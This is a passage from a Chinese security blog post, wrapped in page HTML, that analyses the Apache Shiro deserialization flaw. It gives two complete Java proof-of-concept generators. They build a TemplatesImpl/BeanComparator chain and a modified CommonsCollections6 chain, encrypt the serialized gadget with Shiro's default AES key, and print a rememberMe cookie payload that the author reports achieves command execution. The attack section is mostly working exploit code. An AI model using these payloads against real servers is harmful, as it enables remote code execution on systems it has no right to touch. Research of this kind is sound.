EvilClass helloworld = <span class="hljs-built_in">new</span> EvilClass();<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> setFieldValue(<span class="hljs-keyword">Object</span> obj, String fieldName, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>) throws <span class="hljs-keyword">Exception</span> &#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.<span class="hljs-keyword">set</span>(obj, <span class="hljs-keyword">value</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] argv) throws <span class="hljs-keyword">Exception</span>&#123;<br>        TemplatesImpl templates = <span class="hljs-built_in">new</span> TemplatesImpl();<br>        setFieldValue(templates,&quot;_bytecodes&quot;, <span class="hljs-built_in">new</span> byte[][]&#123; ClassPool.getDefault().<span class="hljs-keyword">get</span>(Evil.<span class="hljs-keyword">class</span>.getName()).toBytecode()&#125;);<br>        setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);<br>        setFieldValue(templates,&quot;_tfactory&quot;, <span class="hljs-built_in">new</span> TransformerFactoryImpl());<br><br>        <span class="hljs-keyword">Class</span> clss = <span class="hljs-keyword">Class</span>.forName(&quot;com.sun.xml.internal.ws.transport.Headers$InsensitiveComparator&quot;);<br>        Constructor constructor = clss.getDeclaredConstructor();<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">Object</span> ob = constructor.newInstance();<br><br>        BeanComparator beanComparator = <span class="hljs-built_in">new</span> BeanComparator(<span class="hljs-keyword">null</span>, (Comparator) ob);<br>        PriorityQueue priorityQueue = <span class="hljs-built_in">new</span> PriorityQueue(<span class="hljs-number">2</span>,beanComparator);<br><br>        priorityQueue.<span class="hljs-keyword">add</span>(&quot;a&quot;);<br>        priorityQueue.<span class="hljs-keyword">add</span>(&quot;a&quot;);<br><br>        setFieldValue(beanComparator,&quot;property&quot;, &quot;outputProperties&quot;);<br>        setFieldValue(priorityQueue,&quot;queue&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;templates,templates&#125;);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-built_in">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-built_in">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        <span class="hljs-keyword">out</span>.writeObject(priorityQueue);<br>        <span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();<br><br>        byte[] bytes = byteArrayOutputStream.toByteArray();<br><br>        AesCipherService aesCipherService = <span class="hljs-built_in">new</span> AesCipherService();<br>        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));<br>        aesCipherService.encrypt(bytes,key);<br>        ByteSource ciphertext = aesCipherService.encrypt(bytes, key);<br>        java.util.Base64.Encoder base = java.util.Base64.getEncoder();<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(base.encodeToString(ciphertext.getBytes()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="有依赖的Payload构造"><a href="#有依赖的Payload构造" class="headerlink" title="有依赖的Payload构造"></a>有依赖的Payload构造</h1><p>在前文，我们分析到，shiro重写了resolveClass关键实现变为<code>ClassUtils.forName(osc.getName());</code></p>
+<p>这就导致了我们在利用链在不能存在数组</p>
+<p>因此我们需要找一个无需数组的利用链</p>
+<p>由于自带的cc版本为3.2.1，且java版本高于8u71，因此选用cc6的链进行改造</p>
+<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>在之前的cc6链分析中，我们知道，cc6的后半段利用的是ChainedTransformer数组</p>
+<p>而ChainedTransformer数组本质上还是调用InvokerTransformer函数反射调用执行具体函数(如Runtime.exec)</p>
+<p>因此如果我们绕过ChainedTransformer数组，直接使用InvokerTransformer方法，就可以绕过数组限制。</p>
+<p>在之前对TemplateImpl的研究中，我们知道，不仅getoutputProperties方法可以触发LoadClass，newTransformer同样也可以触发，所以我们结合InvokerTransformer和TemplateImpl#newTransformer，可以达到绕过数组执行命令</p>
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>为了验证我们的猜想，测试如下代码</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">package com.javasec.shiro;<br><br>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import javassist.ClassPool;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br><br>import static com.javasec.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reset</span>.</span></span>setFieldValue;<br><br>public <span class="hljs-keyword">class</span> Payload2 &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Test</span>.</span><span class="hljs-module"><span class="hljs-identifier">Evil</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>)</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br><br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-params">null</span>,<span class="hljs-params">null</span>)</span>;<br>        invokerTransformer.transform(templates);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/markdown-img-paste-20211201154023502.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功执行命令，证明猜想可行</p>
+<h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>修改cc6的后半段，poc如下</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">package com.javasec.shiro;<br><br>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import javassist.ClassPool;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.keyvalue.TiedMapEntry;<br>import org.apache.commons.collections.map.LazyMap;<br>import org.apache.shiro.codec.Base64;<br>import org.apache.shiro.codec.CodecSupport;<br>import org.apache.shiro.crypto.AesCipherService;<br>import org.apache.shiro.util.ByteSource;<br><br>import java.io.ByteArrayOutputStream;<br>import java.io.ObjectOutputStream;<br>import java.util.HashMap;<br>import java.util.Map;<br><br>import static com.javasec.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reset</span>.</span></span>setFieldValue;<br><br>public <span class="hljs-keyword">class</span> Payload2 &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Test</span>.</span><span class="hljs-module"><span class="hljs-identifier">Evil</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>)</span>;<br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br><br>        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InvokerTransformer(<span class="hljs-string">&quot;getClass&quot;</span>,<span class="hljs-params">null</span>,<span class="hljs-params">null</span>)</span>;<br><br>        Map inmap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HashMap()</span>;<br>        Map outmap = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>decorate(inmap,invokerTransformer);<br><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TiedMapEntry(<span class="hljs-params">outmap</span>,<span class="hljs-params">templates</span>)</span>;<br><br>        Map expmap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HashMap()</span>;<br>        expmap.put(tiedMapEntry,<span class="hljs-string">&quot;value&quot;</span>);<br><br>        outmap.clear<span class="hljs-literal">()</span>;<br><br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">invokerTransformer</span>,<span class="hljs-string">&quot;iMethodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>)</span>;<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;<br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">byteArrayOutputStream</span>)</span>;<br>        out.write<span class="hljs-constructor">Object(<span class="hljs-params">expmap</span>)</span>;<br>        out.close<span class="hljs-literal">()</span>;<br><br>        byte<span class="hljs-literal">[]</span> <span class="hljs-built_in">bytes</span> = byteArrayOutputStream.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>;<br><br>        AesCipherService aesCipherService = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AesCipherService()</span>;<br>        byte<span class="hljs-literal">[]</span> key = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>decode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CodecSupport</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Bytes(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span>);<br>        aesCipherService.encrypt(<span class="hljs-built_in">bytes</span>,key);<br>        ByteSource ciphertext = aesCipherService.encrypt(<span class="hljs-built_in">bytes</span>, key);<br>        java.util.Base64.Encoder base = java.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(base.encode<span class="hljs-constructor">ToString(<span class="hljs-params">ciphertext</span>.<span class="hljs-params">getBytes</span>()</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功执行命令</p>
+<p><img src="/img/markdown-img-paste-20211201165236686.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文分析了shiro的加解密流程，并且根据漏洞点给出了有依赖和无依赖两种POC构造</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/shrio/">shrio</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Weblogic CVE-2015-4852 反序列化漏洞分析</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/15/CommonsCollections-6%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">
+                        <span class="hidden-mobile">Common-Collections-6 反序列化利用分析</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://github.com/errorecho" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="https://www.errorecho.com" target="_blank" rel="nofollow noopener"><span>Blog</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
